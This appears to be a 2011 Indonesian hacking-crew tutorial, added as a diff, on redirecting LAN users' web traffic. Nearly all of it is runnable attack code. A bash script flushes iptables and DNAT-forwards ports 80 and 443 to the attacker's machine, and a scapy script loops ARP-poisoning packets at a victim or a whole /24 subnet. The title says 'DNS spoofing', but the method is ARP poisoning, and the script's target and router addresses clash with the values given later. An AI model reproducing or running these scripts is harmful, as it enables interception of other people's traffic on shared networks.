@@ -1,0 +1,146 @@
+
+bissmillah...
+=============================================
+Malang Cyber Crew | indonesian cyber security
+=============================================
+title    : DNS spoofing with scapy
+auth0r   : yur4kh4
+blog     : http://www.devirakhjib.uni.cc/
+mail     : yur4kh4[at]yahoo[dot[com]
+date	 : 23-03-2011
+Language : Indonesian
+
+
+
+[*]pembuka
+	tulisan ini di buat semata-mata untuk pelajaran saja, tidak ada maksud untuk merusak & meningkatkan traffic cyber crime di indonesia.
+	penulis sangat berharap bahwa masyarakat indonesia bisa lebih meningkatkan security di di bidang IT (khususnya bagi para pengelola)internet cafe
+	& satu hal yang terpenting penulis sangat berharap masyarakat indonesia bisa beralih ke sistem operasi yang open source..hee...
+	
+[*] persiapan
+	" pastikan sistem operasi anda linux
+	" pastikan python scapy terinstall pada sistem operasi anda
+	
+	jika belum terinstall python scapy, anda bisa meng install nya lewat synaptic (dalam hal ini saya menggunakan ubuntu) 
+	jika sudah terinstall lanjut ke tahap selanjutnya.,
+
+[*] konfigurasi
+
+	yang pertama lakukan IP forwading
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+	
+	kemudian non aktivkan ICMP redirect
+	echo 0 > /proc/sys/net/ipv4/conf/$INTERFACE/send_redirects
+
+	next IP tables setting
+	Apa saja yang bisa dilakukan dengan iptables?
+	Dengan kemampuan tools iptables ini, kita bisa membuat aturan (rule), untuk arus lalulintas data.
+	silahkan googleing untuk penjelasan lebih mendalam.
+
+iptables --flush
+iptables --zero
+iptables --delete-chain 
+iptables -F -t nat 
+
+iptables --append FORWARD --in-interface wlan0/eth0 --jump ACCEPT
+iptables --table nat --append POSTROUTING --out-interface wlan0/eth0 --jump MASQUERADE
+iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination 10.42.43.23
+iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination 10.42.43.23
+
+ini bash scriptnya..biar ga repot-repot mengetik di termilal..
+	
+--------------------------------------cut here--------------------------------------------------------
+#########################################################
+#		      yur4kh4				#
+#		 Malang cyber crew			#
+#		    kill-9 crew				#
+#		indonesiancoder team			#
+#########################################################
+#!/bin/sh
+INTERFACE="wlan0" #cek interface dg mengetikan ifconfig di terminal
+SERVERWEB='10.42.43.23' #ip ente
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo 0 > /proc/sys/net/ipv4/conf/$INTERFACE/send_redirects
+
+#clear rule..
+iptables --flush
+iptables --zero
+iptables --delete-chain 
+iptables -F -t nat 
+
+iptables --append FORWARD --in-interface $INTERFACE --jump ACCEPT
+iptables --table nat --append POSTROUTING --out-interface $INTERFACE --jump MASQUERADE
+
+#rendirect traffic.. on my server/proxy
+iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination $SERVERWEB 
+iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination $SERVERWEB
+--------------------------------------cut here--------------------------------------------------------
+save dengan nama: terserah.sh
+
+selanjutnya 
+save script python-scapy ini dengan nama : ihir.py
+--------------------------------------cut here--------------------------------------------------------
+from scapy.all import *;
+from time import sleep;
+conf.iface='wlan0';#network card 
+
+target="10.42.43.1";#target /victim
+
+router="10.42.43.1";#routernya 
+
+packet = ARP(); #bikin packet :P 
+
+packet.psrc = router # Gateway
+
+packet.pdst = target # victim v.v
+
+try:
+	while 1:
+		send(packet, verbose=0);
+		sleep(50);
+except:
+	pass
+--------------------------------------cut here--------------------------------------------------------
+
+nach yg perlu anda lakukan adalah menyesuaikan
+
+INTERFACE="wlan0" #cek interface dg mengetikan ifconfig di terminal
+SERVERWEB='10.42.43.23' #ip ente
+
+network card yang terkoneksi dengan internet serta ip local anda
+& 
+target="10.42.43.19";#target /victim
+
+router="10.42.43.1";#routernya
+
+kalau ingin semua permintaan packet client berpindah ke web server anda
+target="10.42.43.19/24";#target /victim
+
+dengan begitu semua IP local client akan di alihkan ke IP local anda...:D
+
+[*] eksekusi
+
+root@dEviRakhjib:/home/yur4kh4# ./terserah.sh
+root@dEviRakhjib:/home/yur4kh4# python ihir.py 
+
+yupzz.,..tunggu beberapa saat
+semua permintaan packet akan di kirimkan / di alihkan ke IP anda...:D
+
+greettzz.....:D
+
+[*] penutup
+	dengan di jalankannya ihir.py maka berakhir pula tulisan yang sangat sederhana ini..
+	semoga sajha mudah untuk di mengerti..namun jika masih di anggap susah untuk di mengerti
+	silahkan hubungi saya..^_^ 
+	YM : yur4kh4
+		..Jangan berkata TIDAK, karena semua itu BELUM ..
++++++++++++++++++++thankz t0++++++++++++++++++++++++
+[&] allah, muhammad, & seluruh pengikutnya...
+[!] Malang Cyber Crew - kill-9 - Indonesian coder
+[%] Arianom, Tukulesto , marahmerah , kamtiez , vYc0d , xr0b0t
+	contrex , mboys , Pathloader , t3ll0 , Thunder x c0de, jundab
+	ibl13z , geni212 , dhomas , kalong666 ,ichal ,jos_ali_joe, mugna
+		&&**akulukasaatkaupergi**&&
++++++++++++++++++++Luv der4+++++++++++++++++++++++++
+
